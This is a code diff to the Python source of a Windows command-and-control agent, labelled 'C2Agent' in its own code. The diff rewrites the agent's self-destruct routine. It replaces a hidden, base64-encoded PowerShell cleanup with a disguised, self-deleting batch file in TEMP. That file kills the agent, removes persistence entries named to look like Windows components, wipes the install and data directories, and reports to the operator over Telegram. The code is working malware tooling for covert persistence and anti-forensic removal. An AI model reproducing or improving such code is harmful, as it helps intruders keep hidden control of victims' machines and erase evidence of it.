@@ -1062,11 +1062,18 @@ async def update_agent(url: str) -> Tuple[str, bool]:
 async def self_destruct() -> Tuple[str, bool]:
     """
     SELF DESTRUCT: Completely remove the agent from the system.
-    Spawns a detached PowerShell process that:
-    1. cd's to TEMP (so nothing holds a lock on SystemCache)
-    2. Removes persistence (scheduled tasks, registry, startup shortcuts)
-    3. Kills the agent process
-    4. Deletes the install dir and data dir (with fallback to cmd /c rd /s /q)
+    
+    Technique: Write a self-deleting .bat file to %TEMP% and launch it detached.
+    The batch file runs OUTSIDE the install directory and:
+    1. Kills the agent process by PID
+    2. Kills any remaining python/pythonw processes running agent.py (via WMIC)
+    3. Removes persistence (scheduled task, registry run key, startup shortcuts)
+    4. Loops rd /s /q on install dir and data dir until they are deleted
+    5. Deletes itself (del %~f0)
+    
+    This is the classic Windows self-delete technique - a batch file can delete
+    the directory that holds the process because the batch interpreter (cmd.exe)
+    runs from System32, not from the install directory.
     """
     if platform.system() != "Windows":
         return "Self-destruct only supported on Windows", False
@@ -1075,70 +1082,93 @@ async def self_destruct() -> Tuple[str, bool]:
         install_dir = str(get_install_dir().resolve())
         data_dir = str(DATA_DIR.resolve())
         pid = os.getpid()
+        temp_dir = os.environ.get('TEMP', os.environ.get('TMP', r'C:\Windows\Temp'))
         
         print(f"[SELF_DESTRUCT] Install dir: {install_dir}, Data dir: {data_dir}, PID: {pid}")
         
-        # Robust cleanup script
-        ps_script = f"""
-        # 0. Move working directory OUT of install dir so it can be deleted
-        Set-Location $env:TEMP
+        # Write a self-deleting batch file to TEMP
+        bat_path = os.path.join(temp_dir, f'_svc_cleanup_{pid}.bat')
         
-        Start-Sleep -Seconds 4
-        
-        # 1. Remove Persistence
-        try {{
-            Unregister-ScheduledTask -TaskName "C2Agent" -Confirm:$false -ErrorAction SilentlyContinue
-            Remove-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "MicrosoftWindowsCache" -ErrorAction SilentlyContinue
-            Remove-Item "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\C2Update.lnk" -Force -ErrorAction SilentlyContinue
-            Remove-Item "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\C2Agent.lnk" -Force -ErrorAction SilentlyContinue
-        }} catch {{ }}
+        # NOTE on batch escaping:
+        #   - %% in batch = literal % (needed for WMIC wildcards and for-loop vars)
+        #   - %~f0 = full path of this batch file
+        #   - ping -n N 127.0.0.1 > nul = reliable delay (~1 sec per ping)
+        bat_content = f'''@echo off
+:: ===== C2 Agent Self-Destruct Cleanup =====
+:: This file will self-delete after cleanup.
 
-        # 2. Kill Agent Processes
-        try {{
-            Stop-Process -Id {pid} -Force -ErrorAction SilentlyContinue
-            Get-WmiObject Win32_Process | Where-Object {{ ($_.Name -like 'python*' -and $_.CommandLine -like '*agent.py*') }} | ForEach-Object {{ Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }}
-        }} catch {{ }}
+:: Step 1: Wait for agent to finish reporting back to C2
+ping -n 6 127.0.0.1 > nul
+
+:: Step 2: Kill the agent process by PID
+taskkill /f /pid {pid} 2>nul
+ping -n 3 127.0.0.1 > nul
+
+:: Step 3: Kill ANY remaining python/pythonw running agent.py (targeted via WMIC)
+wmic process where "name like 'python%%' and commandline like '%%agent.py%%'" call terminate >nul 2>&1
+ping -n 4 127.0.0.1 > nul
+
+:: Step 4: Remove persistence mechanisms
+schtasks /delete /tn "C2Agent" /f 2>nul
+reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MicrosoftWindowsCache" /f 2>nul
+del /f /q "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\C2Update.lnk" 2>nul
+del /f /q "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\C2Agent.lnk" 2>nul
+
+:: Step 5: Delete install directory (retry loop - max 10 attempts)
+set /a _retries=0
+:del_install
+if not exist "{install_dir}" goto del_data
+rd /s /q "{install_dir}" 2>nul
+if not exist "{install_dir}" goto del_data
+set /a _retries+=1
+if %_retries% GEQ 10 goto del_data
+ping -n 3 127.0.0.1 > nul
+goto del_install
+
+:: Step 6: Delete data directory (retry loop - max 10 attempts)
+:del_data
+set /a _retries=0
+:del_data_loop
+if not exist "{data_dir}" goto done
+rd /s /q "{data_dir}" 2>nul
+if not exist "{data_dir}" goto done
+set /a _retries+=1
+if %_retries% GEQ 10 goto done
+ping -n 3 127.0.0.1 > nul
+goto del_data_loop
+
+:done
+:: Step 7: Self-delete this batch file
+del /f /q "%~f0"
+'''
         
-        Start-Sleep -Seconds 3
+        # Write the batch file
+        with open(bat_path, 'w', encoding='ascii') as f:
+            f.write(bat_content)
         
-        # 3. Delete Files (Install Dir + Data Dir) with retry and fallback
-        foreach ($dir in @('{install_dir}', '{data_dir}')) {{
-            if (Test-Path $dir) {{
-                # Attempt 1: PowerShell Remove-Item
-                try {{ Remove-Item $dir -Recurse -Force -ErrorAction Stop }} catch {{ }}
-                
-                # Attempt 2: If still exists, use cmd /c rd /s /q (more aggressive)
-                if (Test-Path $dir) {{
-                    Start-Sleep -Seconds 2
-                    cmd /c rd /s /q "$dir" 2>$null
-                }}
-                
-                # Attempt 3: Final retry after a delay
-                if (Test-Path $dir) {{
-                    Start-Sleep -Seconds 3
-                    try {{ Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue }} catch {{ }}
-                }}
-            }}
-        }}
-        """
+        print(f"[SELF_DESTRUCT] Batch file written to: {bat_path}")
         
-        # Use EncodedCommand to avoid quoting/escaping issues
-        encoded_command = base64.b64encode(ps_script.encode('utf-16le')).decode('utf-8')
-        
-        # Launch detached PowerShell
+        # Launch batch file completely detached from this process
+        # cmd.exe runs from System32 - it does NOT hold a lock on SystemCache
         _detach = getattr(subprocess, 'DETACHED_PROCESS', 0x00000008)
         _new_group = getattr(subprocess, 'CREATE_NEW_PROCESS_GROUP', 0x00000200)
         
         subprocess.Popen(
-            ['powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-EncodedCommand', encoded_command],
+            ['cmd.exe', '/c', bat_path],
             creationflags=subprocess.CREATE_NO_WINDOW | _detach | _new_group,
-            close_fds=True
+            close_fds=True,
+            cwd=temp_dir,  # Working dir is TEMP, not install dir
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
         )
         
-        # Send goodbye
-        await send_telegram_message("💥 <b>SELF DESTRUCT INITIATED</b>\nTerminating in 4 seconds...")
+        print("[SELF_DESTRUCT] Cleanup batch launched successfully")
         
-        return "Self-destruct initiated. Process will terminate and files will be deleted.", True
+        # Send goodbye
+        await send_telegram_message("💥 <b>SELF DESTRUCT INITIATED</b>\nCleanup batch launched. Agent will terminate in ~5 seconds...")
+        
+        return "Self-destruct initiated. Cleanup batch file launched from TEMP. Process will be killed and files will be deleted.", True
         
     except Exception as e:
         return f"Self-destruct error: {e}", False
